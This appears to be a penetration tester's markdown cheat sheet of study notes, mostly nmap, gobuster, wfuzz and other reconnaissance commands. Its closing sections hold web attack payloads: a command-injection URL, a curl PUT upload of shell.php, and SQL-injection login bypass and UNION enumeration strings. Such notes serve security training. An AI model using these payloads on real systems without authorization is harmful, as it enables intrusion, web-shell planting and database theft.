### Recon
#### AutoRecon
- Always start here, trust me.
```
autorecon -ct 2 -cs 2 -vv -o outputdir 192.168.1.100 192.168.1.1/30 localhost
autorecon x.x.x.x
````
- ct (concurrent targets)
- -o custom output directory location.
- -cs limits the number of concurent scans per target
- Auto recon will create and store the results in the /results directory.
#### NetDiscover
- Netdiscover is an active/passive reconnaissance tool that uses ARP to find live hosts on a local network.
- Netdiscover actively searches for live hosts on the network by broadcasting ARP requests like a router.
- By default netdiscover operates in active mode, however you can use it in passive mode with -p.  With passive move it will not broadcast anything.
- Note: ARP is unable to cross network boundaries or over any VPN connection
``` 
netdiscover -r 10.11.1.0/24
````
#### Nmap
- I have no time to read, just give me the meta.
````
nmap -sS x.x.x.x -p- --min-rate 10000
nmap -A -T5 x.x.x.x -p- -vv
nmap --script=scriptname.nse x.x.x.x -vv
````
- Ping Scan -sn Option
- -sn tells nmap to perform host discovery only without any additional port scanning and prints out details of any hosts that responded.
````
nmap -sn 10.11.1.0/24
````
- nmap also has the -Pn option which will disable the host discovery stage altogether on a scan.  The -Pn option is best used in combination with other scans.
-TCP Connect Scan
- The TCP connect scan in Nmap is the alternative TCP scan to use when a SYN scan is not an option.  
- TCP connect scan should be used when nmap does not have raw packet privileges which is required for a SYN scan.
- TCP complete performs the entire 3 way handshake.
- SLOW!
````
nmap -sT [target host]
````
-TCP SYN Scan
- The TCP SYN scan is usually the best scan option in most cases and is known as the ‘stealthy port scan.’
- Does not complete the 3 way handshake
````
nmap -sS [target host]
````
- UDP Port Scanning
- Always check for UDP ports will pick up DNS, NTP, SNMP 
- Check top 100 ports with the `-F` option.
- Generally much slower than TCP scanning 
````
nmap -sU [target host]
nmap -sU -F [target host]
````
- Fingerprint Services
- To figure out what services are running on target ports we use:
````
nmap -sV [target ip address]
````
- The following command will use nmap port scan to detect the service and OS:
````
nmap -sV -O [target ip address]
````
- Can also use the -A option in Nmap.  The A stands for aggressive scan options and enables OS detection, script scanning and traceroute.
````
nmap -A [target ip address]
````
- Scanning port ranges with Nmap
- By default nmap will only scan the most 1000 common ports. To override the default use the -p
````
nmap -p 1-100 [target host]
nmap -p 137-139,445 [target host]
````
- NSE
- Location of scripts 
````
/usr/share/nmap/scripts
````
- Scripts are sorted by protocol, can sort by service
````
ls -l /usr/share/nmap/scripts/ftp*
````
- Nmap script help 
````
nmap --script-help ftp-anon
````
- Nmap script execution
````
nmap --script=[script name] [target host]
````
- The following command executes a script names http-robots.txt on port 80:
````
nmap --script=http-robots.txt [target host]
````


#### Nikto
```
nikto -h x.x.x.x
```
#### GoBuster
```
gobuster -u x.x.x.x
gobuster dir -u http://x.x.x.x -w /usr/share/wordlists/dirb/common.txt
gobuster -u http://x.x.x.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php
gobuster -s 200,204,301,302,307,403 -u x.x.x.x
```
##### Wfuzz
```
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 x.x.x.x/FUZZ
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 x.x.x.x/FUZZ
wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://x.x.x.x/FUZZ.php
wfuzz --hw=1 --hh=3076 -w seclist_common_wordlist.txt http://x.x.x.x/FUZZ
```
##### WpScan
```
wpscan --url http://x.x.x.x --enumerate u,p,t
```
##### SNMPWalk
```
snmpwalk -c public -v1 x.x.x.x
````
##### Webdav
- Incorrect permissions test 
```
cadaver http://x.x.x.x
davtest http://x.x.x.x
```
##### Command Injection
- File Traverse:
```
x.x.x.x/file.php?cmd=ls
```
- Test file upload with curl
```
curl -vX options http://x.x.x.x 
```
- Upload file using curl to website with PUT option available
```
curl --upload-file shell.php --url http://x.x.x.x
```
##### Login Bypass
```
john ' or '1'='1
```
- Enter into username and password
##### Determine vulnerable columns or column that is visible
```
param=' or 1=0 union select null,null,null
param=' or 1=0 union select 1,2,3
```
- Else try
```
param=' or 1=1 union select table_name,null,null from information_schema.tables
```
- If it produces an error try table_name at other positions
- Say Column 1 and 2 are visible from the above queries
- Further Enumerate
```
param=' or 1=0 union select table_schema,null,null from information_schema.columns
```
-Display all databse names
```
param=' or 1=0 union select table_name,null,null from information_schema.columns
```
- Display all table names
```
param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'
```
- Display tables inside public databse

